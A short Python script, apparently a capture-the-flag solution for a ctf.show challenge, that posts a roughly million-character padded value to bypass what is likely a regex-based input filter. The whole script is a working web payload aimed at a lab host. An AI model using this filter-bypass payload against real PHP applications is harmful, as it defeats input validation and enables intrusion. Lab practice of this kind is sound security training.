# coding=utf-8

import requests

url = "http://cf6d4cb1-95ce-4732-bfcc-b94f3403a780.chall.ctf.show/"

data = {
    'f': 'very' * 250000 + '36Dctfshow'
}

response = requests.post(url, data=data)

print(response.text)
